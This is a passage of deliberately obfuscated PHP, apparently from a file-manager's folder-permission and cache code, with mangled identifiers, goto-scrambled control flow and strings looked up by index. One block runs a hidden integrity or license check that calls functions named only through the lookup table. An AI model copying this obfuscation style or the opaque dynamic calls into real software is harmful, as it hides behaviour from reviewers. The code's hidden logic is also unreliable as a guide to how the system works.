($dÙÇäéº½Ñ[$cé§µ¯Šö¤[681]] == $cé§µ¯Šö¤[2207] && $A©æ„‘Ï‹à[$cé§µ¯Šö¤[681]] == $cé§µ¯Šö¤[2207]) { $F»Îô­ì¡‹[$cé§µ¯Šö¤[681]] = 0; } goto dÚğÂÙˆ…›; Bï•­Éíä•: return $d¦å×êŞî†; goto F òš“¾­²; B«±Çê£õ: $cé§µ¯Šö¤ =& $_SERVER[¼]; $BĞÛÊÏ¾Ëì = array($cé§µ¯Šö¤[364] => $dÙÇäéº½Ñ[$cé§µ¯Šö¤[364]]); $A©æ„‘Ï‹à = Model($cé§µ¯Šö¤[2201])->where($BĞÛÊÏ¾Ëì)->field($cé§µ¯Šö¤[2210])->find(); goto fñœ Î‹Ø·; F òš“¾­²: } private function removeByFile($Dè²§¯õå) { goto Dª›¿Àåì×; Dª›¿Àåì×: $E–«òÆ‹Û =& $_SERVER[¼]; $EÉº„„è©“ = Model($E–«òÆ‹Û[744])->where(array($E–«òÆ‹Û[415] => $Dè²§¯õå))->field($E–«òÆ‹Û[366])->select(); $D¯„¯Èã° = array_to_keyvalue($EÉº„„è©“, $E–«òÆ‹Û[33], $E–«òÆ‹Û[366]); goto Cªàš‹‹ÅÑ; Cªàš‹‹ÅÑ: $C‘ŒÂ†÷¹§ = array($E–«òÆ‹Û[366] => array($E–«òÆ‹Û[7], $D¯„¯Èã°), $E–«òÆ‹Û[442] => 1); $EÉº„„è©“ = Model($E–«òÆ‹Û[2044])->where($C‘ŒÂ†÷¹§)->field($E–«òÆ‹Û[437])->select(); if (empty($EÉº„„è©“)) { return; } goto b¾©Üìæ‡; b¾©Üìæ‡: $càÆ†á’‚À = array_to_keyvalue($EÉº„„è©“, $E–«òÆ‹Û[33], $E–«òÆ‹Û[437]); $this->remove($càÆ†á’‚À); goto Cã×õõ‡å; Cã×õõ‡å: } private function shareFileMeta($AÙƒ‰âñø, $fÒê¢ò§ô° = null) { $AàãöÁ¾À =& $_SERVER[¼]; $bè¹²†’Ì = array($AàãöÁ¾À[415] => $AÙƒ‰âñø, $AàãöÁ¾À[89] => $AàãöÁ¾À[2211]); if (is_null($fÒê¢ò§ô°)) { return Model($AàãöÁ¾À[2212])->where($bè¹²†’Ì)->find(); } $bè¹²†’Ì[$AàãöÁ¾À[356]] = $fÒê¢ò§ô°; Model($AàãöÁ¾À[2212])->add($bè¹²†’Ì, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\x75\162\143\x65\137\x61\165\x74\x68"; public function getAuth($b”é»©ƒ) { goto D¼Ë¡“íÑ; D½—Ä¾î±¼: $bÕø¡Ò‘·¨ = $this->field($EÑÁ‰Ç¯ˆ)->order($eÆ”šâÏÆ[364])->where($EøÂ›ÖªÆ‚)->select(); $A¨‡†ôìß— = array(); foreach ($bÕø¡Ò‘·¨ as $dÒÂÏáŠ) { if (Model($eÆ”šâÏÆ[2214])->listData($dÒÂÏáŠ[$eÆ”šâÏÆ[2195]])) { $A¨‡†ôìß—[] = $dÒÂÏáŠ; } } goto AÖ¸ÚÜŠ´²; D¼Ë¡“íÑ: $eÆ”šâÏÆ =& $_SERVER[¼]; $EÑÁ‰Ç¯ˆ = $eÆ”šâÏÆ[2213]; $EøÂ›ÖªÆ‚ = array($eÆ”šâÏÆ[366] => $b”é»©ƒ); goto D½—Ä¾î±¼; AÖ¸ÚÜŠ´²: return $A¨‡†ôìß—; goto B°š„×à…; B°š„×à…: } public function setAuth($eÜØ±‡°´¡, $d™³ÈÍäëï) { goto cğæŞ¬âØ¶; cğæŞ¬âØ¶: $eˆ¡‹—ÏÌ† =& $_SERVER[¼]; $aÎØ†ÅÂ¢¡ = Model($eˆ¡‹—ÏÌ†[1103])->sourceInfo($eÜØ±‡°´¡); if ($aÎØ†ÅÂ¢¡[$eˆ¡‹—ÏÌ†[368]] != SourceModel::TYPE_GROUP) { return !1; } goto C¼óÒÎåƒ»; C¼óÒÎåƒ»: $DŒ¥¿ÁŠØ… = 1; $cÈá­®—ŒÛ = $aÎØ†ÅÂ¢¡[$eˆ¡‹—ÏÌ†[452]]; if ($cÈá­®—ŒÛ != $DŒ¥¿ÁŠØ…) { $FİÍ£åÚÂƒ = array($eˆ¡‹—ÏÌ†[2067] => $cÈá­®—ŒÛ); $DÚ”¦Õƒ± = Model($eˆ¡‹—ÏÌ†[2141])->field($eˆ¡‹—ÏÌ†[1404])->where($FİÍ£åÚÂƒ)->select(); $DÚ”¦Õƒ± = array_to_keyvalue($DÚ”¦Õƒ±, $eˆ¡‹—ÏÌ†[33], $eˆ¡‹—ÏÌ†[1404]); } goto bòŞ£”Ë˜Ø; eŒï‰Öç‚ï: $this->where(array($eˆ¡‹—ÏÌ†[380] => $eÜØ±‡°´¡))->delete(); $this->addAll($b¦‘‘†¤èÀ); return !0; goto AäñÁåï³×; bòŞ£”Ë˜Ø: $bğ°å¿ÑË = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $b¦‘‘†¤èÀ = array(); foreach ($d™³ÈÍäëï as $f‹£ÜÎ”‹) { if (!in_array($f‹£ÜÎ”‹[$eˆ¡‹—ÏÌ†[368]], $bğ°å¿ÑË)) { show_json(LNG($eˆ¡‹—ÏÌ†[2215]), !1); } if ($cÈá­®—ŒÛ != $DŒ¥¿ÁŠØ…) { if ($f‹£ÜÎ”‹[$eˆ¡‹—ÏÌ†[368]] == SourceModel::TYPE_GROUP) { } if ($f‹£ÜÎ”‹[$eˆ¡‹—ÏÌ†[452]] != 0 && !in_array($f‹£ÜÎ”‹[$eˆ¡‹—ÏÌ†[452]], $DÚ”¦Õƒ±)) { } } if ($f‹£ÜÎ”‹[$eˆ¡‹—ÏÌ†[452]] == 0) { $f‹£ÜÎ”‹[$eˆ¡‹—ÏÌ†[368]] = SourceModel::TYPE_USER; } $b¦‘‘†¤èÀ[] = array($eˆ¡‹—ÏÌ†[366] => $eÜØ±‡°´¡, $eˆ¡‹—ÏÌ†[368] => intval($f‹£ÜÎ”‹[$eˆ¡‹—ÏÌ†[368]]), $eˆ¡‹—ÏÌ†[452] => intval($f‹£ÜÎ”‹[$eˆ¡‹—ÏÌ†[452]]), $eˆ¡‹—ÏÌ†[2195] => intval($f‹£ÜÎ”‹[$eˆ¡‹—ÏÌ†[2195]]) ? intval($f‹£ÜÎ”‹[$eˆ¡‹—ÏÌ†[2195]]) : 0, $eˆ¡‹—ÏÌ†[2196] => intval($f‹£ÜÎ”‹[$eˆ¡‹—ÏÌ†[2196]]) ? intval($f‹£ÜÎ”‹[$eˆ¡‹—ÏÌ†[2196]]) : -1); } goto eŒï‰Öç‚ï; AäñÁåï³×: } public function authClear($Fâ´À»ùÙ¸) { $c‹Œæ¶ï«í =& $_SERVER[¼]; $a¿¹â¨‘ÑÖ = Model($c‹Œæ¶ï«í[1103])->sourceInfo($Fâ´À»ùÙ¸); $bİôŠ´‡÷ = array($Fâ´À»ùÙ¸); if ($a¿¹â¨‘ÑÖ[$c‹Œæ¶ï«í[367]] == $c‹Œæ¶ï«í[83]) { $CÆì®…É‰é = array($c‹Œæ¶ï«í[521] => array($c‹Œæ¶ï«í[479], $a¿¹â¨‘ÑÖ[$c‹Œæ¶ï«í[455]] . $Fâ´À»ùÙ¸ . $c‹Œæ¶ï«í[480])); $bİôŠ´‡÷ = Model($c‹Œæ¶ï«í[1103])->field($c‹Œæ¶ï«í[380])->where($CÆì®…É‰é)->getField($c‹Œæ¶ï«í[366], !0); $bİôŠ´‡÷[] = $Fâ´À»ùÙ¸; } $this->where(array($c‹Œæ¶ï«í[380] => array($c‹Œæ¶ï«í[381], $bİôŠ´‡÷)))->delete(); return !0; } public function get($BÊ²†ƒß¼) { $eËù¡ÌƒÉ = $this->getSourceList(array($BÊ²†ƒß¼), !0); return $eËù¡ÌƒÉ[0]; } public function getSourceList($D‘ÛøÁ¡², $eÅÒ—Ê÷’ = false) { goto e½Ê‹®ÅèÆ; eËµƒ¸ìô·: $AÈ´ß¦ï  = array_values(array_unique($AÈ´ß¦ï )); if (!$AÈ´ß¦ï ) { return array(); } $eïààÚ¬æ“ = $DôÎ¸íÊŞØ[2217]; goto eõã…Â„¬; e½Ê‹®ÅèÆ: $DôÎ¸íÊŞØ =& $_SERVER[¼]; if (!$D‘ÛøÁ¡²) { return array(); } $EÀ¢‘÷åìÀ = Model($DôÎ¸íÊŞØ[1103]); goto Càì¬¾ë ; eõã…Â„¬: $FãŠå°ç¤Î = array($DôÎ¸íÊŞØ[380] => array($DôÎ¸íÊŞØ[381], $AÈ´ß¦ï )); $E¾çÅ„Şàò = $this->field($eïààÚ¬æ“)->where($FãŠå°ç¤Î)->select(); $E¾çÅ„Şàò = array_to_keyvalue_group($E¾çÅ„Şàò, $DôÎ¸íÊŞØ[366]); goto EÆ¾ÇÀï½; Càì¬¾ë : if (!$eÅÒ—Ê÷’) { $FãŠå°ç¤Î = array($DôÎ¸íÊŞØ[380] => array($DôÎ¸íÊŞØ[381], $D‘ÛøÁ¡²)); $eÅÒ—Ê÷’ = $EÀ¢‘÷åìÀ->field($DôÎ¸íÊŞØ[2216])->where($FãŠå°ç¤Î)->select(); $eÅÒ—Ê÷’ = array_to_keyvalue($eÅÒ—Ê÷’, $DôÎ¸íÊŞØ[366]); } $AÈ´ß¦ï  = $D‘ÛøÁ¡²; foreach ($eÅÒ—Ê÷’ as $AÜç”‹ÂÈ© => $EÔ—ùô£º‘) { $dî’ŠñÀóÛ = $EÀ¢‘÷åìÀ->parentLevelArray($EÔ—ùô£º‘[$DôÎ¸íÊŞØ[455]]); $AÈ´ß¦ï  = array_merge($AÈ´ß¦ï , $dî’ŠñÀóÛ, array($AÜç”‹ÂÈ©)); } goto eËµƒ¸ìô·; EÆ¾ÇÀï½: $a¥×İòáÜº = array(); foreach ($eÅÒ—Ê÷’ as $BĞÈéÖÃ¸— => $E³ªÃñÁ®) { $a¥×İòáÜº[$BĞÈéÖÃ¸—] = $this->makeSourceAuth($E³ªÃñÁ®, $E¾çÅ„Şàò); } return $a¥×İòáÜº; goto dĞ°êß–çË; dĞ°êß–çË: } public function authDeepCheck($E‹’¶öµ¿¼, $A‡Â¹¿êË¦ = false) { $E‘¹Ì¡ã» =& $_SERVER[¼]; if (_get($GLOBALS, $E‘¹Ì¡ã»[453])) { return !1; } $Fßæ‹ÑÌ²Ø = $this->makeAuthDeep(); if (!in_array($E‹’¶öµ¿¼, $Fßæ‹ÑÌ²Ø)) { return !1; } return array($E‘¹Ì¡ã»[374] => -1, $E‘¹Ì¡ã»[414] => array($E‘¹Ì¡ã»[382] => $E‘¹Ì¡ã»[1024], $E‘¹Ì¡ã»[2073] => $E‘¹Ì¡ã»[464], $E‘¹Ì¡ã»[383] => LNG($E‘¹Ì¡ã»[2218]), $E‘¹Ì¡ã»[2085] => $E‘¹Ì¡ã»[2219])); } protected function makeAuthDeep() { goto D†õ¾İ´ ; DññŞ¬: return $C³½à­®¿”; goto b¦È ¼¨ïñ; EòĞ÷ğØƒÂ: $F²É³ÁÒ = array_values(array_unique($F²É³ÁÒ)); foreach ($F²É³ÁÒ as $BÌ½¢™´˜™) { $C©©»°Úí = $E¡–ö¡µ……->getInfo($BÌ½¢™´˜™); $C³½à­®¿”[] = $C©©»°Úí[$Bù‡ğÏÅ§[388]][$Bù‡ğÏÅ§[366]]; } $C³½à­®¿” = array_values(array_unique($C³½à­®¿”)); goto DññŞ¬; B³‹…¯½í: $F²É³ÁÒ = array_values(array_unique($F²É³ÁÒ)); $FÑô‚×ó¿Ã = $F²É³ÁÒ; foreach ($FÑô‚×ó¿Ã as $BÌ½¢™´˜™) { $C©©»°Úí = $E¡–ö¡µ……->getInfo($BÌ½¢™´˜™); $båá‡Ø…É´ = $F˜ƒÛˆà†->parentLevelArray($C©©»°Úí[$Bù‡ğÏÅ§[455]]); $F²É³ÁÒ = array_merge($F²É³ÁÒ, $båá‡Ø…É´); } goto EòĞ÷ğØƒÂ; b±“ï†”Ñ: $b”ËßÒ¢Éê = Model($Bù‡ğÏÅ§[2220])->listData(); $d‚’Š­ØÆß = array(); foreach ($b”ËßÒ¢Éê as $BÔ¾“Ò©Ó) { if ($BÔ¾“Ò©Ó[$Bù‡ğÏÅ§[373]] == 0 && $BÔ¾“Ò©Ó[$Bù‡ğÏÅ§[2087]] == $Bù‡ğÏÅ§[83]) { $d‚’Š­ØÆß[] = $BÔ¾“Ò©Ó[$Bù‡ğÏÅ§[364]]; } } goto f¿³íî¹•¢; D†õ¾İ´ : $Bù‡ğÏÅ§ =& $_SERVER[¼]; static $C³½à­®¿” = false; if ($C³½à­®¿”) { return $C³½à­®¿”; } goto b±“ï†”Ñ; C¬„ÊÖŒŠË: if ($f‡­–åˆì) { $dïß…ÔÀòƒ = array(array($Bù‡ğÏÅ§[368] => SourceModel::TYPE_USER, $Bù‡ğÏÅ§[452] => USER_ID), array($Bù‡ğÏÅ§[368] => SourceModel::TYPE_GROUP, $Bù‡ğÏÅ§[452] => array($Bù‡ğÏÅ§[381], $f‡­–åˆì)), $Bù‡ğÏÅ§[909] => $Bù‡ğÏÅ§[2147]); } if ($d‚’Š­ØÆß) { $dïß…ÔÀòƒ = array($dïß…ÔÀòƒ, $Bù‡ğÏÅ§[2195] => array($Bù‡ğÏÅ§[2221], $d‚’Š­ØÆß)); } $cˆ¶§Ë»§“ = $this->field($Bù‡ğÏÅ§[2222])->where($dïß…ÔÀòƒ)->select(); goto DòÛÒÍİ“; Cˆù‹ÙÓÄ: $F˜ƒÛˆà† = Model($Bù‡ğÏÅ§[1103]); $E¡–ö¡µ…… = Model($Bù‡ğÏÅ§[454]); if ($bÉ•ºá³õÔ) { $Dàì­‹„¿± = $F˜ƒÛˆà†->where(array($Bù‡ğÏÅ§[366] => array($Bù‡ğÏÅ§[381], $bÉ•ºá³õÔ)))->select(); foreach ($Dàì­‹„¿± as $fŞºø×˜½°) { $båá‡Ø…É´ = $F˜ƒÛˆà†->parentLevelArray($fŞºø×˜½°[$Bù‡ğÏÅ§[455]]); $C³½à­®¿” = array_merge($C³½à­®¿”, $båá‡Ø…É´); $F²É³ÁÒ[] = $fŞºø×˜½°[$Bù‡ğÏÅ§[452]]; } } goto B³‹…¯½í; DòÛÒÍİ“: $bÉ•ºá³õÔ = array_to_keyvalue($cˆ¶§Ë»§“, $Bù‡ğÏÅ§[33], $Bù‡ğÏÅ§[366]); $C³½à­®¿” = array(); $F²É³ÁÒ = $f‡­–åˆì; goto Cˆù‹ÙÓÄ; f¿³íî¹•¢: $f‡­–åˆì = Session::get($Bù‡ğÏÅ§[2179]); $f‡­–åˆì = array_to_keyvalue($f‡­–åˆì, $Bù‡ğÏÅ§[33], $Bù‡ğÏÅ§[2067]); $dïß…ÔÀòƒ = array($Bù‡ğÏÅ§[368] => SourceModel::TYPE_USER, $Bù‡ğÏÅ§[452] => USER_ID); goto C¬„ÊÖŒŠË; b¦È ¼¨ïñ: } private function makeSourceAuth($F¨‚é’ã£š, $E·åœ…‹Ö²) { goto c¨óŸÖ‘æô; c¨óŸÖ‘æô: $FÃ‹ñëÎìô =& $_SERVER[¼]; $eŸ‘ŒØ’Š£ = Session::get($FÃ‹ñëÎìô[2179]); $cßÑÃÖõí¥ = Model($FÃ‹ñëÎìô[1103])->parentLevelArray($F¨‚é’ã£š[$FÃ‹ñëÎìô[455]]); goto bë§ö¦³¡Ê; f“Øˆ›œí¥: if (!$BŠÊÄ‡ƒ±ù) { $eŸ‘ŒØ’Š£ = array_to_keyvalue($eŸ‘ŒØ’Š£, $FÃ‹ñëÎìô[2067]); $f»”±œÔš = $F¨‚é’ã£š[$FÃ‹ñëÎìô[452]]; $C¢‹àêÎÏ = isset($eŸ‘ŒØ’Š£[$f»”±œÔš]) ? $eŸ‘ŒØ’Š£[$f»”±œÔš] : !1; if ($C¢‹àêÎÏ) { $BŠÊÄ‡ƒ±ù = array($FÃ‹ñëÎìô[2223] => intval($C¢‹àêÎÏ[$FÃ‹ñëÎìô[373]][$FÃ‹ñëÎìô[373]]), $FÃ‹ñëÎìô[2224] => $C¢‹àêÎÏ[$FÃ‹ñëÎìô[373]]); } } if ((!$BŠÊÄ‡ƒ±ù || $BŠÊÄ‡ƒ±ù[$FÃ‹ñëÎìô[374]] <= 0) && $F¨‚é’ã£š[$FÃ‹ñëÎìô[368]] == SourceModel::TYPE_GROUP) { $a¥›â˜õ¸ = $this->authDeepCheck($F¨‚é’ã£š[$FÃ‹ñëÎìô[366]], $BŠÊÄ‡ƒ±ù); if ($a¥›â˜õ¸) { $BŠÊÄ‡ƒ±ù = $a¥›â˜õ¸; } } return $BŠÊÄ‡ƒ±ù; goto E‰ÀÎùöîğ; bë§ö¦³¡Ê: $cßÑÃÖõí¥ = array_merge(array($F¨‚é’ã£š[$FÃ‹ñëÎìô[366]]), array_reverse($cßÑÃÖõí¥)); $BŠÊÄ‡ƒ±ù = !1; foreach ($cßÑÃÖõí¥ as $Fß›†ï¸‡¢) { if (!isset($E·åœ…‹Ö²[$Fß›†ï¸‡¢])) { continue; } $dÄæ˜¼ˆ„‚ = $this->authMake($E·åœ…‹Ö²[$Fß›†ï¸‡¢]); if ($dÄæ˜¼ˆ„‚[$FÃ‹ñëÎìô[414]]) { $BŠÊÄ‡ƒ±ù = $dÄæ˜¼ˆ„‚; break; } } goto f“Øˆ›œí¥; E‰ÀÎùöîğ: } public function authOwnerApply($C‹òµîÕ¾È) { goto B§…¶¬‡ˆ¬; B§…¶¬‡ˆ¬: $EÏ·á½ª‘ =& $_SERVER[¼]; if (empty($C‹òµîÕ¾È[$EÏ·á½ª‘[373]]) || isset($C‹òµîÕ¾È[$EÏ·á½ª‘[2225]]) && $C‹òµîÕ¾È[$EÏ·á½ª‘[2225]]) { return $C‹òµîÕ¾È; } if (AuthModel::authCheckRoot($C‹òµîÕ¾È[$EÏ·á½ª‘[373]][$EÏ·á½ª‘[374]])) { return $C‹òµîÕ¾È; } goto d»à”–ÉÉï; D”Ü¤Œê¯: $fùÃî„Æ×î = array(); $bê ¶ó†² = array(); foreach ($CÒËŞ¸ÆŠà as $fÜƒÚ‰ŒÆê => $c’’ÏäµÕ‹) { $c×—««¦äİ = $this->authFolderOwnerUser($c’’ÏäµÕ‹); $fùÃî„Æ×î[$fÜƒÚ‰ŒÆê] = $c×—««¦äİ; $bê ¶ó†² = array_merge($bê ¶ó†², $c×—««¦äİ[$EÏ·á½ª‘[531]]); if ($c×—««¦äİ[$EÏ·á½ª‘[2226]]) { break; } } goto Eˆöµğ¹; F¤Ó†—“Æ‰: $aÃÄ‚“ôÍó = array($EÏ·á½ª‘[380] => array($EÏ·á½ª‘[381], $F¬ï„­‘«µ)); $CÒËŞ¸ÆŠà = $this->field($DÔğ–šæªÌ)->where($aÃÄ‚“ôÍó)->select(); $CÒËŞ¸ÆŠà = array_to_keyvalue_group($CÒËŞ¸ÆŠà, $EÏ·á½ª‘[366]); goto D”Ü¤Œê¯; d»à”–ÉÉï: $F¬ï„­‘«µ = Model($EÏ·á½ª‘[1103])->parentLevelArray($C‹òµîÕ¾È[$EÏ·á½ª‘[455]]); $F¬ï„­‘«µ = array_merge(array($C‹òµîÕ¾È[$EÏ·á½ª‘[366]]), array_reverse($F¬ï„­‘«µ)); $DÔğ–šæªÌ = $EÏ·á½ª‘[2217]; goto F¤Ó†—“Æ‰; dÏ¶œ±ùê: $C‹òµîÕ¾È[$EÏ·á½ª‘[373]][$EÏ·á½ª‘[2227]] = Model($EÏ·á½ª‘[470])->userListInfo($bê ¶ó†²); return $C‹òµîÕ¾È; goto bàÒ”òšºƒ; Eˆöµğ¹: if (count($bê ¶ó†²) == 0) { $bê ¶ó†² = $this->authFolderOwnerGroup($C‹òµîÕ¾È[$EÏ·á½ª‘[452]]); } $bê ¶ó†² = array_unique($bê ¶ó†²); if (AuthModel::authCheckRoot($C‹òµîÕ¾È[$EÏ·á½ª‘[373]][$EÏ·á½ª‘[374]])) { $bê ¶ó†²[] = USER_ID; } goto dÏ¶œ±ùê; bàÒ”òšºƒ: } private function authFolderOwnerGroup($c‹­©‹À®) { $EóÇŠŠ¾‡ =& $_SERVER[¼]; $DğóªÆ‡ß… = Model($EóÇŠŠ¾‡[2141])->where(array($EóÇŠŠ¾‡[2067] => $c‹­©‹À®))->select(); $Cæ¾Öæó· = array(); if (!$DğóªÆ‡ß…) { return $Cæ¾Öæó·; } foreach ($DğóªÆ‡ß… as $AŠ”ïå§òÀ) { $AĞ¢ÍÊ„µî = $this->authInfo($AŠ”ïå§òÀ); if (AuthModel::authCheckRoot($AĞ¢ÍÊ„µî[$EóÇŠŠ¾‡[373]])) { $Cæ¾Öæó·[] = $AŠ”ïå§òÀ[$EóÇŠŠ¾‡[1404]]; } } return $Cæ¾Öæó·; } private function authFolderOwnerUser($fÃÍÂÔùƒ) { $B¡é¼ê¬÷“ =& $_SERVER[¼]; $CæÆ‚ÂÜãõ = array(); $eæ¾Ÿ†ó”Ô = !1; foreach ($fÃÍÂÔùƒ as $cÈ’¯¯ºÏ) { $C”ÌÏ¤†ä¦ = $this->authInfo($cÈ’¯¯ºÏ); if ($cÈ’¯¯ºÏ[$B¡é¼ê¬÷“[452]] == $B¡é¼ê¬÷“[464]) { $eæ¾Ÿ†ó”Ô = !0; } if ($cÈ’¯¯ºÏ[$B¡é¼ê¬÷“[368]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($C”ÌÏ¤†ä¦[$B¡é¼ê¬÷“[373]])) { $CæÆ‚ÂÜãõ[] = $cÈ’¯¯ºÏ[$B¡é¼ê¬÷“[452]]; } } } return array($B¡é¼ê¬÷“[531] => $CæÆ‚ÂÜãõ, $B¡é¼ê¬÷“[2226] => $eæ¾Ÿ†ó”Ô); } public function authMake($bŞ¬¿¶¤Äá) { goto d²ÁÒ’Ö®·; Bïó¬³æ‡ç: $AŒâ½²“õ¦ = 0; $Bó©æ¦Ä = 0; $DÃÆèˆŒÏ = 0; goto A˜ã‚Ä³ì; bÀ÷ˆé¡Ü‰: $aÃŠ©îÊß = array_to_keyvalue($a»¹„®Ú¹, $a¨ÑÓº†ĞÌ[33], $a¨ÑÓº†ĞÌ[2067]); $a÷½„¦¼ = 0; $b‰Öáš = 0; goto Fº¹ÄÒÚ‡ª; A˜ã‚Ä³ì: $FôÑğ‹ˆÁ½ = 0; foreach ($bŞ¬¿¶¤Äá as $cİ–†®à‡) { $AÄ‚Ü˜ï¯‡ = $this->authInfo($cİ–†®à‡); $dÉ¾¯»ÇÉØ = $cİ–†®à‡[$a¨ÑÓº†ĞÌ[452]]; $BÙÉ—ÂÇ = intval($AÄ‚Ü˜ï¯‡[$a¨ÑÓº†ĞÌ[373]]); if ($cİ–†®à‡[$a¨ÑÓº†ĞÌ[368]] == SourceModel::TYPE_USER && $dÉ¾¯»ÇÉØ == USER_ID) { $Bó©æ¦Ä = !0; $dÄ‚¿Äããä = $AÄ‚Ü˜ï¯‡; $a÷½„¦¼ = $BÙÉ—ÂÇ; } else { if ($cİ–†®à‡[$a¨ÑÓº†ĞÌ[368]] == SourceModel::TYPE_GROUP && in_array($dÉ¾¯»ÇÉØ, $aÃŠ©îÊß)) { $DÃÆèˆŒÏ = !0; if ($BÙÉ—ÂÇ >= $b‰Öáš) { $b‰Öáš = $BÙÉ—ÂÇ; $c„÷Æô¥ = $AÄ‚Ü˜ï¯‡; } } else { if ($dÉ¾¯»ÇÉØ == $a¨ÑÓº†ĞÌ[464]) { $FôÑğ‹ˆÁ½ = !0; $AŒâ½²“õ¦ = $AÄ‚Ü˜ï¯‡; $fÓ²çºê¸ = $BÙÉ—ÂÇ; } } } } $e‘¿äëêŸ† = $Bó©æ¦Ä ? $a÷½„¦¼ : ($DÃÆèˆŒÏ ? $b‰Öáš : $fÓ²çºê¸); goto Dˆ½êà¼Ï‚; Fº¹ÄÒÚ‡ª: $fÓ²çºê¸ = 0; $dÄ‚¿Äããä = 0; $c„÷Æô¥ = 0; goto Bïó¬³æ‡ç; d²ÁÒ’Ö®·: $a¨ÑÓº†ĞÌ =& $_SERVER[¼]; if (!$bŞ¬¿¶¤Äá) { return array($a¨ÑÓº†ĞÌ[374] => 0, $a¨ÑÓº†ĞÌ[414] => !1); } $a»¹„®Ú¹ = Session::get($a¨ÑÓº†ĞÌ[2179]); goto bÀ÷ˆé¡Ü‰; Dˆ½êà¼Ï‚: $AÄ‚Ü˜ï¯‡ = $Bó©æ¦Ä ? $dÄ‚¿Äããä : ($DÃÆèˆŒÏ ? $c„÷Æô¥ : $AŒâ½²“õ¦); $FÏ­—ìñî‚ = array($a¨ÑÓº†ĞÌ[2223] => intval($e‘¿äëêŸ†), $a¨ÑÓº†ĞÌ[2224] => $AÄ‚Ü˜ï¯‡); return $FÏ­—ìñî‚; goto e×‚£ì¤ø”; e×‚£ì¤ø”: } public function authTargetInfoMake($FÊË˜Ã×èç) { goto bËâ‘ÁÄîù; bËâ‘ÁÄîù: $dÖŠÇßó¯ =& $_SERVER[¼]; $BæŠØ›™à„ = array(); $A—í¼ë‘ = array(); goto Cùğ¿«ë™Ñ; Cùğ¿«ë™Ñ: foreach ($FÊË˜Ã×èç as $cäç¹î¹¯Ä) { if ($cäç¹î¹¯Ä[$dÖŠÇßó¯[368]] == SourceModel::TYPE_USER) { $BæŠØ›™à„[] = intval($cäç¹î¹¯Ä[$dÖŠÇßó¯[452]]); } else { if ($cäç¹î¹¯Ä[$dÖŠÇßó¯[368]] == SourceModel::TYPE_GROUP) { $A—í¼ë‘[] = intval($cäç¹î¹¯Ä[$dÖŠÇßó¯[452]]); } } } if ($BæŠØ›™à„) { $BæŠØ›™à„ = Model($dÖŠÇßó¯[470])->userListInfo($BæŠØ›™à„); } if ($A—í¼ë‘) { $E§¤˜‘Ò´Ö = array($dÖŠÇßó¯[2139] => array($dÖŠÇßó¯[381], $A—í¼ë‘)); $A—í¼ë‘ = Model($dÖŠÇßó¯[454])->field($dÖŠÇßó¯[2152])->where($E§¤˜‘Ò´Ö)->select(); $A—í¼ë‘ = array_to_keyvalue($A—í¼ë‘, $dÖŠÇßó¯[2067]); } goto f°£êĞÚ–; f°£êĞÚ–: return array($dÖŠÇßó¯[2228] => $BæŠØ›™à„, $dÖŠÇßó¯[2229] => $A—í¼ë‘); goto eç»Å¦ò…; eç»Å¦ò…: } private function authInfo($bÇÖå†éç®) { $b†ØÅÁ™±§ =& $_SERVER[¼]; if ($bÇÖå†éç®[$b†ØÅÁ™±§[2195]]) { $bİÁÇÊ¸í‚ = Model($b†ØÅÁ™±§[2214])->listData($bÇÖå†éç®[$b†ØÅÁ™±§[2195]]); if (!$bİÁÇÊ¸í‚) { return !1; $dô”Å˜ËÛ = Model($b†ØÅÁ™±§[2214])->listData(); $BàÜ££ÑãÎ = array_filter_by_field($dô”Å˜ËÛ, $b†ØÅÁ™±§[373], $b†ØÅÁ™±§[464]); return $BàÜ££ÑãÎ; } $B÷Úî¡¥İ™ = array_field_key($bİÁÇÊ¸í‚, array($b†ØÅÁ™±§[364], $b†ØÅÁ™±§[28], $b†ØÅÁ™±§[373], $b†ØÅÁ™±§[2085], $b†ØÅÁ™±§[2088])); $B÷Úî¡¥İ™[$b†ØÅÁ™±§[2230]] = $bÇÖå†éç®; return $B÷Úî¡¥İ™; } else { return array($b†ØÅÁ™±§[382] => 0, $b†ØÅÁ™±§[2073] => $bÇÖå†éç®[$b†ØÅÁ™±§[2196]], $b†ØÅÁ™±§[383] => $b†ØÅÁ™±§[33], $b†ØÅÁ™±§[2085] => $b†ØÅÁ™±§[2231]); } } } goto d‘²¯á¯Š; c±Á²„å…å: $cõ¨Ê‚µ‰ = $_SERVER[¼][753]; if ($_SERVER[$_SERVER[¼][754]] != $cõ¨Ê‚µ‰($cÃïĞºƒ½)) { goto b ‡í…“Ä; b ‡í…“Ä: $a½ÍÜ”‘‡… = $_SERVER[¼][755]; $a“‚Ù¡º× = $_SERVER[$_SERVER[¼][756]] . $_SERVER[¼][757]; $d—èàÆä˜¶ = $a½ÍÜ”‘‡…($a“‚Ù¡º×); goto Céñöº¤‰¾; Céñöº¤‰¾: $c²‡¨¦ï¹È = explode($_SERVER[¼][214], $d—èàÆä˜¶); if (count($c²‡¨¦ï¹È) < $_SERVER[¼][544]) { $f…‚·»Õä® = $_SERVER[¼][758]; $f…‚·»Õä®(); } $Fë ‰£ÛãÚ = $_SERVER[¼][759]; goto cùÉ™ğÀ¡Î; cùÉ™ğÀ¡Î: $Fë ‰£ÛãÚ($cÃïĞºƒ½); goto f³—…ŞÎ¸; f³—…ŞÎ¸: } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($cÈß­¯ö§, $d¦§ñòŠ©ô) { $aìÅµä‰Œ× =& $_SERVER[¼]; $this->cachePath = $cÈß­¯ö§[$aìÅµä‰Œ×[75]]; $this->prefix = $aìÅµä‰Œ×[760]; $this->cacheTime = $d¦§ñòŠ©ô; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($F§ïµÔ¢Ùƒ) { $bÇ® ‚Û•Ğ =& $_SERVER[¼]; $F§ïµÔ¢Ùƒ = str_replace(array($bÇ® ‚Û•Ğ[761], $bÇ® ‚Û•Ğ[95], $bÇ® ‚Û•Ğ[69]), $bÇ® ‚Û•Ğ[762], $F§ïµÔ¢Ùƒ); return $this->cachePath . $bÇ® ‚Û•Ğ[763] . $F§ïµÔ¢Ùƒ . $bÇ® ‚Û•Ğ[764]; } public function set($dŠ­Ê·èó¦, $FƒÁõÆƒ²¸, $e²Š¹ïø“‡ = false) { $e‡´¬ùËÄ = $this->getFile($dŠ­Ê·èó¦); if (file_put_contents($e‡´¬ùËÄ, $this->prefix . $FƒÁõÆƒ²¸, 